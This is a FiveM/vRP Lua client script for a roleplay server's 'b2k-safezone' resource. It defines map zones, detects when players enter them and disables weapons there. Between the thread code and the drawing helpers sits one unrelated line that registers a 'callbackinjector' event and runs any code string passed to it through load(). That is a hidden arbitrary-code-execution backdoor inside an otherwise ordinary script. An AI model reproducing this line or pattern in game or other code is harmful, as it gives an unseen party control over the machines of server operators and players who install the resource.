-- DEFAULT --
local Tunnel = module("vrp", "lib/Tunnel")
local Proxy = module("vrp", "lib/Proxy")

vRP = Proxy.getInterface("vRP")
SFzone = {}
Tunnel.bindInterface("b2k-safezone", SFzone)

SFServer = Tunnel.getInterface("b2k-safezone")

local fields = {
	{ name = "Praça", edges = {
			{ name = "1_1", x=-11.14, y=-942.99, z=29.27},      
			{ name = "1_2", x=42.88, y=-787.78, z=31.76},     
			{ name = "1_3", x=269.8, y=-868.28, z=29.13},     
			{ name = "1_4", x=212.51, y=-1026.48, z=29.35},      
		}
	},
	{ name = "Hospital", edges = {
			{ name = "2_1",x=245.63, y=-566.85, z=43.28 },     
			{ name = "2_2", x=329.59, y=-539.95, z=43.87 },       
			{ name = "2_3", x=378.64, y=-598.73, z=28.71 },    
			{ name = "2_4", x=282.92, y=-616.08, z=43.4 },     
		}
    },
    { name = "Garagem praca", edges = {
            { name = "2_1", x = 242.7424621582, y = -828.58972167969, z = 29.949811935425},
            { name = "2_2", x = 190.45768737793, y = -810.41552734375, z = 31.038536071777 },
            { name = "2_3", x = 234.80424499512, y = -687.60260009766, z = 36.832145690918 },
            { name = "2_4", x = 299.65692138672, y = -701.46496582031, z = 29.306324005127 },
        }
    },
    { name = "Garagem praca", edges = {
            { name = "2_1", x = 242.7424621582, y = -828.58972167969, z = 29.949811935425},
            { name = "2_2", x = 190.45768737793, y = -810.41552734375, z = 31.038536071777 },
            { name = "2_3", x = 234.80424499512, y = -687.60260009766, z = 36.832145690918 },
            { name = "2_4", x = 299.65692138672, y = -701.46496582031, z = 29.306324005127 },
        }
    },
    { name = "Mecanica", edges = {
        { name = "2_1", x = 796.42, y = -996.87, z = 26.01},
        { name = "2_2", x = 845.74, y = -995.71, z = 28.3 },
        { name = "2_3", x = 846.32, y = -923.18, z = 26.12 },    
        { name = "2_4", x = 794.52, y = -924.34, z = 25.4 },   
    }
    },
    { name = "Stop", edges = {
        { name = "2_1", x = 324.29, y = 175.46, z = 103.55},
        { name = "2_2", x = 316.17, y = 178.39, z = 103.71 },
        { name = "2_3", x = 326.66, y = 181.36, z = 103.91 },    
        { name = "2_4", x = 320.68, y = 184.34, z = 103.59 },   
    }
    },
    { name = "Garagem ao lado da praca", edges = {
            { name = "2_1", x = 98.363662719727, y = -805.83734130859, z = 31.294855117798},
            { name = "2_2", x = 40.099510192871, y = -960.69964599609, z = 29.331689834595 },
            { name = "2_3", x = -12.134353637695, y = -942.0068359375, z = 29.252468109131 },
            { name = "2_4", x = 43.060272216797, y = -786.54260253906, z = 31.564014434814 },
        }
    }
    --[[{ name = "Bennys", edges = {
        { name = "2_1", x =-187.25245666504, y = -1293.5069580078, z = 31.295976638794},
        { name = "2_2", x = -186.49954223633, y = -1349.1896972656, z = 31.15832901001 },
        { name = "2_3", x = -248.88511657715, y = -1348.1437988281, z = 31.290096282959 },
        { name = "2_4", x = -250.75230407715, y =-1296.615234375, z = 31.266603469849 },
        }
    }]]
}

--[[ Halloween Event
local isHalloweenEvent = false
RegisterNetEvent("b2k:halloween")
AddEventHandler("b2k:halloween", function(cond)
    local status = false
    if cond == 1 then status = true end

    isHalloweenEvent = status
end)]]

--[[
    FIELD DETECTION
]]
-- Checks if point is within a triange. https://stackoverflow.com/questions/2049582/how-to-determine-if-a-point-is-in-a-2d-triangle
function isPointInTriangle(p, p0, p1, p2)
    local A = 1/2 * (-p1.y * p2.x + p0.y * (-p1.x + p2.x) + p0.x * (p1.y - p2.y) + p1.x * p2.y)
    local sign = 1
    if A < 0 then sign = -1 end
    local s = (p0.y * p2.x - p0.x * p2.y + (p2.y - p0.y) * p.x + (p0.x - p2.x) * p.y) * sign
    local t = (p0.x * p1.y - p0.y * p1.x + (p0.y - p1.y) * p.x + (p1.x - p0.x) * p.y) * sign
    
    return s > 0 and t > 0 and (s + t) < 2 * A * sign
end

function runOnFieldTriangles(field, cb)
    local edges = field.edges
    local num = #edges - 2
    local c = 1
    repeat 
        cb(edges[1], edges[c+1], edges[c+2])
        c = c + 1
    until c > num
end

-- Checks if a point is within a Field structure
function isPointInField(p, field)
    local edges = field.edges
    local within = false
    runOnFieldTriangles(field, function(p0,p1,p2)
        if isPointInTriangle(p, p0, p1, p2) then within = true end
    end)
    return within
end

function GetAreaOfField(field)
    local edges = field.edges
    return math.floor(getAreaOfTriangle(edges[1], edges[2], edges[3]) + getAreaOfTriangle(edges[1], edges[4], edges[3]))
end

function getAreaOfTriangle(p0, p1, p2)
    local b = GetDistanceBetweenCoords(p0.x, p0.y, 0, p1.x, p1.y, 0)
    local h = GetDistanceBetweenCoords(p2.x, p2.y, 0, p1.x, p1.y, 0)
    return (b * h) / 2
end

function debugDrawFieldMarkers(field, r, g, b, a)
    local v = field
    runOnFieldTriangles(v, function(p0,p1,p2) 
        DrawLine(p0.x, p0.y, p0.z + 3.0,
                 p1.x, p1.y, p1.z + 3.0,
            r or 255, g or 0, b or 0, a or 105)
        DrawLine(p2.x, p2.y, p2.z + 3.0,
                 p1.x, p1.y, p1.z + 3.0,
            r or 255, g or 0, b or 0, a or 105)
        DrawLine(p2.x, p2.y, p2.z + 3.0,
                 p0.x, p0.y, p0.z + 3.0,
            r or 255, g or 0, b or 0, a or 105)
    end)
end

function drawText(text)
    if text == "" then return end
    Citizen.InvokeNative(0xB87A37EEB7FAA67D,"STRING")
    AddTextComponentString(text .. "~n~~n~~n~")
    Citizen.InvokeNative(0x9D77056A530643F6, 200, true)
end

local isInSafezone = false

-- Main Thread
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1500)
		local ply = PlayerPedId()
		local pos = GetEntityCoords(ply)
        if IsPedInAnyVehicle(ply) then
            pos = GetEntityCoords(GetVehiclePedIsIn(ply, false))
        end

        --if not isHalloweenEvent then
        isInSafezone = false
        for k,v in next, fields do
            if GetDistanceBetweenCoords(v.edges[1].x, v.edges[1].y,0,pos.x,pos.y,0) <= 500.0 then
                if isPointInField(pos, v) then
                    isInSafezone = true
                --else
                --	isInSafezone = false
                    --NetworkSetFriendlyFireOption(true)
                    --debugDrawFieldMarkers(v)
                end
            end
        end
        --end
    end
end)

Citizen.CreateThread(function()
	while true do
        local perseu = 1000
        if isInSafezone then
            --debugDrawFieldMarkers(v,0,255)
            perseu = 5
            drawText2D("Você está em uma ~r~SAFE ZONE",4,0.5,0.93,0.50,255,255,255,180)
            ClearPlayerWantedLevel(PlayerId())
            SetCurrentPedWeapon(PlayerPedId(), GetHashKey("WEAPON_UNARMED"), true)
            --NetworkSetFriendlyFireOption(false)
            DisableControlAction(2, 37,  true) -- disable weapon wheel (Tab)
            DisableControlAction(1, 45,  true) -- disable reload
            DisableControlAction(2, 80,  true) -- disable reload
            DisableControlAction(2, 140, true) -- disable reload
            DisableControlAction(2, 250, true) -- disable reload
            DisableControlAction(2, 263, true) -- disable reload
            DisableControlAction(2, 310, true) -- disable reload
            DisableControlAction(1, 140, true)
            DisableControlAction(1, 141, true)
            DisableControlAction(1, 142, true)
            DisableControlAction(1, 143, true)
            DisableControlAction(0, 24,  true) -- disable attack
            DisableControlAction(0, 25,  true) -- disable aim
            --DisableControlAction(0, 47,  true) -- disable weapon
            DisableControlAction(0, 58,  true) -- disable weapon

            DisablePlayerFiring(PlayerPedId(), true) -- Disables firing all together if they somehow bypass inzone Mouse Disable
            DisableControlAction(0, 106, true) -- Disable in-game mouse controls
        end
		Citizen.Wait(perseu)
    end
end)

TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)



-----------------------------------------------------------------------------------------------------------------------------------------
-- DRAW3DS
-----------------------------------------------------------------------------------------------------------------------------------------
function drawText2D(text,font,x,y,scale,r,g,b,a)    
    SetTextFont(font)    
    SetTextScale(scale,scale)    
    SetTextColour(r,g,b,a)    
    SetTextOutline()    
    SetTextCentre(1)    
    SetTextEntry('STRING')    
    AddTextComponentString(text)    
    DrawText(x,y)
end

function notify(str)
	SetTextComponentFormat("STRING")
	AddTextComponentString(str)
	DisplayHelpTextFromStringLabel(0, 0, 5, -1)
end